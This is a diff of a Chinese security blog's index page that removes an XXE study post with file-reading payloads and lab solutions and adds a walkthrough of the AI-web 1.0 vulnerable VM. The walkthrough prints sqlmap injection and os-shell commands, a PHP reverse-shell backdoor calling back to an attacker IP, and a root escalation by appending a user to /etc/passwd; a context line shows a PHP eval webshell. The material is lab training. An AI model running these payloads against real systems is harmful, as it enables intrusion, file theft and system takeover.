@@ -314,8 +314,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%85%B6%E4%BB%96%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index">
-                    <span itemprop="name">其他中间件漏洞</span>
+                  <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index">
+                    <span itemprop="name">中间件漏洞</span>
                   </a>
                 </span>
 
@@ -1723,335 +1723,6 @@ echo '<?php @eval($_POST[margin]);?>' > shell.php</code></pre>
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/02/xxe-lou-dong-xue-xi/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/02/xxe-lou-dong-xue-xi/" itemprop="url">XXE漏洞学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T23:29:05+08:00">
-                2020-04-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
-                    <span itemprop="name">web漏洞学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="XXE漏洞学习笔记-靶场实战"><a href="#XXE漏洞学习笔记-靶场实战" class="headerlink" title="XXE漏洞学习笔记+靶场实战"></a>XXE漏洞学习笔记+靶场实战</h2><p>这里推荐一篇全面介绍XXE漏洞的文章：<a href="https://xz.aliyun.com/t/3357#toc-23" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-23</a></p>
-<h4 id="一、关于XML和XXE的基础知识"><a href="#一、关于XML和XXE的基础知识" class="headerlink" title="一、关于XML和XXE的基础知识"></a>一、关于XML和XXE的基础知识</h4><p>​     XXE全称XML,也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。要想搞懂XXE，一定要先了解XML语法规则和外部实体的定义及调用形式。</p>
-<h5 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h5><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素。XML语法规则：</p>
-<p>1.所有的XML元素都必须有一个关闭标签；</p>
-<p>2.XML标签对大小写敏感。</p>
-<p>3.XML必须正确嵌套。</p>
-<p>4.XML属性值必须加“”。</p>
-<ul>
-<li>XML被设计为传输和存储数据，其焦点是数据的内容。</li>
-<li>HTML被设计用来显示数据，其焦点是数据的外观。</li>
-</ul>
-<p><strong>XML基本文档结构</strong></p>
-<pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--XML声明--></span>
-<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
-<span class="token comment" spellcheck="true">&lt;!--DTD，这部分可选的--></span>          
-<span class="token doctype">&lt;!DOCTYPE foo [ 
-&lt;!ELEMENT foo ANY ></span>
-&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
-]>
-<span class="token comment" spellcheck="true">&lt;!--文档元素--></span>                                                                          
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></code></pre>
-<h5 id="xml元素介绍"><a href="#xml元素介绍" class="headerlink" title="xml元素介绍"></a>xml元素介绍</h5><p>XML元素是指从开始标签直到结束标签的部分。每个元素又有对应的属性，XML属性必须加引号。</p>
-<p>注意：</p>
-<ul>
-<li><p>XML文档必须有一个根元素。</p>
-</li>
-<li><p>XML元素必须有一个关闭标签</p>
-</li>
-<li><p>XML标签对大小写敏感</p>
-</li>
-<li><p>XML元素必须被正确的嵌套。</p>
-</li>
-<li><p>XML属性值必须加引号</p>
-</li>
-</ul>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200117181423.png" alt=""></p>
-<h5 id="XML-DTD介绍"><a href="#XML-DTD介绍" class="headerlink" title="XML DTD介绍"></a>XML DTD介绍</h5><p>DTD文档类型定义，约束了xml文档的结构。拥有正确语法的XML被称为“形式良好”的XML，通过DTD验证约束XML是“合法”的XML。</p>
-<img src="QQ截图20200117183256.png" style="zoom: 67%;" />
-
-<h5 id="DTD含义"><a href="#DTD含义" class="headerlink" title="DTD含义"></a>DTD含义</h5><p>XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD文档类型定义的东西控制的。</p>
-<p>DTD用来描述xml文档的结构，一个DTD文档包含：</p>
-<ul>
-<li>元素的定义规则</li>
-<li>元素之间的关系规则</li>
-<li>属性的定义规则</li>
-</ul>
-<p>DTD可被成行地声明于xml文档中，也可作为一个外部引用。</p>
-<h5 id="内部的DOCTYPE声明"><a href="#内部的DOCTYPE声明" class="headerlink" title="内部的DOCTYPE声明"></a>内部的DOCTYPE声明</h5><p>内部声明DTD类型声明：<!DOCTYPE 根元素 [子元素声明]></p>
-<img src="QQ截图20200117195250.png" style="zoom:67%;" />
-
-<h5 id="引用外部实体："><a href="#引用外部实体：" class="headerlink" title="引用外部实体："></a>引用外部实体：</h5><p>我们主要关注XML外部实体的定义和调用方式：</p>
-<!ENTITY 实体名称 SYSTEM "URL"><p> </p>
-<p><strong>实例：</strong></p>
-<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
-<span class="token doctype">&lt;!DOCTYPE root-element SYSTEM "test.dtd"></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>you<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>are<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>very<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>good!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre>
-<p>test.dtd</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMNET</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">head</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span></code></pre>
-<p>- PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</p>
-<h5 id="DTD实体介绍"><a href="#DTD实体介绍" class="headerlink" title="DTD实体介绍"></a>DTD实体介绍</h5><p>实体定义：实体是用于定义引用普通文本或者特殊字符的快捷方式的变量。</p>
-<p>在DTD中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。除外部参数实体引用以字符（%）开始外，其他参数实体都以字符(&amp;)开始，以字符(;)结束。</p>
-<h5 id="内部实体："><a href="#内部实体：" class="headerlink" title="内部实体："></a>内部实体：</h5><!ENTITY 实体名称 ”实体的值">
-
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200117200803.png" alt=""></p>
-<h5 id="外部实体："><a href="#外部实体：" class="headerlink" title="外部实体："></a>外部实体：</h5><!ENTITY 实体名称 SYSTEM "URl/URL">
-
-<img src="QQ截图20200117201148.png"  />
-
-<h5 id="外部参数实体："><a href="#外部参数实体：" class="headerlink" title="外部参数实体："></a>外部参数实体：</h5><!ENTITY % 实体名 “实体内容">
-
-<p>该类型的实体用“%”字符声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容：</p>
-<p><strong>示例：</strong></p>
-<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span>
-<span class="token doctype">&lt;!DOCTYPE demo [
-            &lt;!ENTITY % first "Hello"></span>
-            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">second</span> <span class="token attr-name">"&amp;first;_world"</span><span class="token punctuation">></span></span>
-%second;]></code></pre>
-<p>​                                </p>
-<h4 id="XML注入漏洞（XXE漏洞）"><a href="#XML注入漏洞（XXE漏洞）" class="headerlink" title="XML注入漏洞（XXE漏洞）"></a>XML注入漏洞（XXE漏洞）</h4><h5 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h5><p>XXE漏洞全称XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
-<p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的XML文件进行过滤，导致可以上传恶意的XML文件。</p>
-<p>通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p>
-<h5 id="常见的XXE漏洞类型"><a href="#常见的XXE漏洞类型" class="headerlink" title="常见的XXE漏洞类型"></a>常见的XXE漏洞类型</h5><ul>
-<li><strong>基础的XXE注入</strong>——外部实体注入本地DTD</li>
-<li><strong>基于盲注的XXE注入</strong>——xml解析器在响应中不显示任何错误。、</li>
-<li><strong>基于错误的XXE注入</strong>——成功解析之后，XML解析器始终显示SAME响应。（您的消息已被接收）。因此，我们可能希望解析器将文件的内容“打印”到错误响应中。</li>
-</ul>
-<h5 id="XXE漏洞危害"><a href="#XXE漏洞危害" class="headerlink" title="XXE漏洞危害"></a>XXE漏洞危害</h5><ul>
-<li>任意文件读取</li>
-<li>探测内网地址</li>
-<li>通过DTD窃取文件</li>
-<li>远程代码执行</li>
-</ul>
-<h5 id="XXE漏洞的测试方法"><a href="#XXE漏洞的测试方法" class="headerlink" title="XXE漏洞的测试方法"></a>XXE漏洞的测试方法</h5><p>发现post请求的接口的时候，可以这样试试：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
-&lt;!DOCTYPE a [ 
-&lt;!ENTITY test &quot;THIS IS A STRING!&quot;&gt; 
-]&gt; 
-&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>如果发现了一个错误：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
-&lt;!DOCTYPE a 
-[&lt;!ENTITY test &quot;nice string bro&quot;&gt;] 
-&gt;
-&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>说明能够解析，试试读文件：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE a 
-[&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;] 
-&gt;
-
-&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>或者用php伪协议：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
-&lt;!DOCTYPE a 
-[&lt;!ENTITY test SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;] 
-&gt;
-&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>得到的结国再base64解码即可。</p>
-<h5 id="XXE漏洞的防御"><a href="#XXE漏洞的防御" class="headerlink" title="XXE漏洞的防御"></a>XXE漏洞的防御</h5><p>方案：使用开发语言提供的禁用外部实体的方法。</p>
-<p><strong>1.PHP</strong>：</p>
-<p>libxml_disable_entity_loader(true);</p>
-<p><strong>2.JAVA:</strong></p>
-<p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</p>
-<p>dbf.setExpandEntityReferences(false);</p>
-<p><strong>3.Python：</strong></p>
-<p>from lxml import etree</p>
-<p>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
-<h3 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h3><h4 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h4><h5 id="pikachu靶场简介"><a href="#pikachu靶场简介" class="headerlink" title="pikachu靶场简介"></a>pikachu靶场简介</h5><p>​     Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。</p>
-<h5 id="XXE漏洞利用进行文件读取"><a href="#XXE漏洞利用进行文件读取" class="headerlink" title="XXE漏洞利用进行文件读取"></a>XXE漏洞利用进行文件读取</h5><p>我们首先在本地进入网站，选择XXE模块</p>
-<img src="QQ截图20200123165140.png" style="zoom: 50%;" />
-
-
-
-<p>构造利用payload</p>
-<img src="QQ截图20200123170052.png" style="zoom:67%;" />
-
-<p>将payload填入输入框进行提交</p>
-<img src="QQ截图20200123165827.png" style="zoom:50%;" />
-
-<p>可见我们提交的内容显现在了页面。</p>
-<p>我们在D盘下新建一个1.txt文件，内容为：</p>
-<img src="QQ截图20200123170613.png" style="zoom: 80%;" />
-
-<p>然后构造利用代码：</p>
-<img src="QQ截图20200123171804.png" style="zoom:80%;" />
-
-<p>提交，我们可以成功读取到本地1.txt文件的内容</p>
-<img src="QQ截图20200123170601.png" style="zoom: 67%;" />
-
-
-
-
-
-<h4 id="CTF-jarvisoj-xxe"><a href="#CTF-jarvisoj-xxe" class="headerlink" title="CTF-jarvisoj(xxe)"></a>CTF-jarvisoj(xxe)</h4><p>我们进入题目，发现有一个输出框</p>
-<img src="QQ截图20200202185412.png" style="zoom: 80%;" />
-
-
-
-<p>我们输入任意内容然后进行抓包</p>
-<img src="QQ截图20200202185424.png" style="zoom: 80%;" />
-
-<p>将Content-Type的值改为application/xml，然后提交xml发现能够被解析</p>
-<p>我们构造payload读取目标机器/home/ctf/flag.txt中的flag值。</p>
-<pre><code>&lt;!DOCTYPE foo [
-    &lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;
-]&gt;
-&lt;root&gt;
-    &lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;</code></pre><img src="QQ截图20200202185528.png" style="zoom:67%;" />
-
-<p>可以看到成功读取。</p>
-<h4 id="BWAPP-（XXE部分）"><a href="#BWAPP-（XXE部分）" class="headerlink" title="BWAPP （XXE部分）"></a>BWAPP （XXE部分）</h4><p>我们先点击黑体字获取XXE攻击脚本。</p>
-<img src="QQ截图20200128170206.png" style="zoom:67%;" />
-
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt=""></p>
-<p>然后使用Burp抓包后发送到Repeater模块</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt=""></p>
-<p><strong>第一次我们使用http协议读取robots.txt文件内容</strong></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt=""></p>
-<p><strong>第二次我们使用php协议读取 xml页面中的内容</strong></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt=""></p>
-<p><strong>第三次我们使用file协议读取本机的/etc/passwd的内容</strong></p>
-<img src="QQ截图20200128180043.png" style="zoom:67%;" />
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2858,8 +2529,8 @@ cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试学习</span>
                   </a>
                 </span>
 
@@ -2897,7 +2568,8 @@ cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
       
         
           
-            <h2 id="端口渗透总结"><a href="#端口渗透总结" class="headerlink" title="端口渗透总结"></a>端口渗透总结</h2><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>口渗透过程中我们需要关注几个问题：</p>
+            <p><strong>转载自：</strong><a href="https://www.shangmayuan.com/a/5536cbdf4f7b417da40a35fa.html" target="_blank" rel="noopener">https://www.shangmayuan.com/a/5536cbdf4f7b417da40a35fa.html</a></p>
+<h2 id="端口渗透总结"><a href="#端口渗透总结" class="headerlink" title="端口渗透总结"></a>端口渗透总结</h2><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>口渗透过程中我们需要关注几个问题：</p>
 <p>1、 端口的banner信息</p>
 <p>2、 端口上运行的服务</p>
 <p>3、 常见应用的默认端口</p>
@@ -3424,6 +3096,200 @@ cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/12/ai-web1-0-ba-ji-xue-xi/" itemprop="url">AI-web1.0靶机学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T22:37:46+08:00">
+                2020-03-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">靶机学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="AI-web-1-0靶机学习"><a href="#AI-web-1-0靶机学习" class="headerlink" title="AI-web 1.0靶机学习"></a>AI-web 1.0靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们尝试使用nmap的二层发现功能进行主机扫描</p>
+<pre><code>nmap -sn 192.168.153.0/24 </code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185007.png" alt=""></p>
+<h4 id="第二步、端口扫描"><a href="#第二步、端口扫描" class="headerlink" title="第二步、端口扫描"></a>第二步、端口扫描</h4><p>我们初步确定靶机IP为192.168.153.135后，继续使用nmap进行端口扫描和信息收集。</p>
+<pre><code>nmap -A -p 1-65535 192.168.153.135 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185240.png" alt=""></p>
+<p>我们发现靶机的80端口上运行apache服务，并且发现了一个文件上传的目录</p>
+<p>我们尝试访问该ip的80端口,发现页面只有一句没什么用的话。。。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185640.png" alt=""></p>
+<h4 id="第三步、web信息收集"><a href="#第三步、web信息收集" class="headerlink" title="第三步、web信息收集"></a>第三步、web信息收集</h4><p>我们使用dirsearch工具尝试扫一下网站的目录。</p>
+<pre><code>dirb http://192.168.153.135</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185739.png" alt=""></p>
+<p>发现目录下存在robots.txt文件，我们看看里面有没有什么敏感文件。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185821.png" alt=""></p>
+<p>文件里给出了三个目录，我们依次进行访问，发现只有 /se3reTdir777/目录可以正常访问，发现是一个登陆点。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190345.png" alt=""></p>
+<p>我们输入任意数字，进行抓包判断，发现明显的注入点uid。使用sqlmap进行自动化扫描。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190358.png" alt=""></p>
+<h4 id="第四步、sqlmap自动化注入"><a href="#第四步、sqlmap自动化注入" class="headerlink" title="第四步、sqlmap自动化注入"></a>第四步、sqlmap自动化注入</h4><p>我们使用sqlmap进行自动化扫描。</p>
+<pre><code>python sqlmap.py -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;peration=Submit&quot; --dbs --batch</code></pre><p>得到了我们想要的数据库 aiweb1</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190647.png" alt=""></p>
+<p>继续对目标数据库中的表进行探测</p>
+<pre><code>python sqlmap.py -u &quot;http:192.168.153.135/se3reTdir777/&quot;--data &quot;uid=1&amp;peration=Submit&quot; -D  aiweb1 --tables --batch</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190733.png" alt=""></p>
+<p>探测字段</p>
+<pre><code>sqlmap -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  -D aiweb1 -T user --columns --batch</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190849.png" alt=""></p>
+<p>发现没有我们想要的信息。。。。。。只能换思路。</p>
+<h4 id="第五步、sqlmap反弹shell"><a href="#第五步、sqlmap反弹shell" class="headerlink" title="第五步、sqlmap反弹shell"></a>第五步、sqlmap反弹shell</h4><p>我们发现之前robots下存在一个 /m3diNf0/ 目录禁止访问，我们这里再次对其进行爆破。</p>
+<pre><code>dirb http://192.168.153.135/m3diNf0/ </code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215110747.png" alt=""></p>
+<p>我们发现目录下存在一个info.php，我们尝试对其进行访问。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206192302.png" alt=""></p>
+<p>发现这是一个phpinfo配置页面。并且在其中发现了网站的根目录在home下。</p>
+<p>知道了网站的根目录，我们就可以尝试使用sqlmap反弹shell。</p>
+<pre><code>sqlmap -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --level=3 --os-shell</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215112454.png" alt=""></p>
+<p>依次选择4:php web server</p>
+<p>​                2:custom location</p>
+<p>网站路径：/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</p>
+<p>​                PS：优先选择此路径的原因是sql注入在该页面下。</p>
+<h4 id="第六步、php后门反弹shell"><a href="#第六步、php后门反弹shell" class="headerlink" title="第六步、php后门反弹shell"></a>第六步、php后门反弹shell</h4><p>​    提示需要一个终端，所以我们得想办法反弹一个shell。在这里我们已经得到一个shell，可以写一个后门，在这里写一个php后门。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$sock</span><span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string">"192.168.153.152"</span><span class="token punctuation">,</span><span class="token number">4567</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>我们尝试访问本地的127.0.0.1的4567端口。发现可以正常访问目录下的文件。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114220.png" alt=""></p>
+<p>我们在shell下载下a.php文件。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114406.png" alt=""></p>
+<p>我们在kali下监听 9966端口。</p>
+<pre><code>nc -lvp 9966</code></pre><p>然后我们在使用php命令运行我们下载的php后门。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114646.png" alt=""></p>
+<p>我们可以发现kali已经成功反弹shell。</p>
+<h4 id="第七步、提权获得flag"><a href="#第七步、提权获得flag" class="headerlink" title="第七步、提权获得flag"></a>第七步、提权获得flag</h4><p>我们首先使用ptthon提升为交互式shell:</p>
+<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>​    发现当前用户不是root用户但是这个用户可以对/etc/passwd 文件进行写入权限，所以我们试着添加一个用户看看： 因为写入的时候密码是加密的，所以要先加密密码:</p>
+<pre><code>openssl passwd -1 -salt abc 000000</code></pre><p>再写入密码：</p>
+<pre><code>echo &#39;abc&#39;:$1$abc$yzqAxwzjwao0BUFj9nRwF/:0:0::/root：/bin/bash&#39;&gt;&gt;/etc/passwd</code></pre><p>最后使用su命令切换为root用户。得到Flag.</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215115210.png" alt=""></p>
+<p><strong>完</strong></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
   
@@ -3478,7 +3344,7 @@ cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">41</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3500,7 +3366,7 @@ cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-count">29</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
